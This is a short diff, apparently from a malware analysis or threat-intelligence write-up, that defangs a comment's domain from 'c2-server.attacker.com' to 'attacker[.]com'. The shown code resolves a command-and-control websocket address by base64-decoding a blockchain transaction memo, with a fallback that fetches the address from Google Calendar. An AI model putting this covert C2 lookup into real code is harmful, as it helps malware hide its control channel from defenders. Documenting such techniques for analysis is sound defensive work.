@@ -854,7 +854,7 @@ console.log(message);
         const memo = decodeMessage(txDetails.transaction.message);
         
         // Decode base64 memo to get C2 address
-        return atob(memo); // Returns: "wss://c2-server.attacker.com"
+        return atob(memo); // Returns: "wss://c2-server.attacker[.]com"
     } catch (e) {
         // Fallback to Google Calendar
         return await getC2FromCalendar();
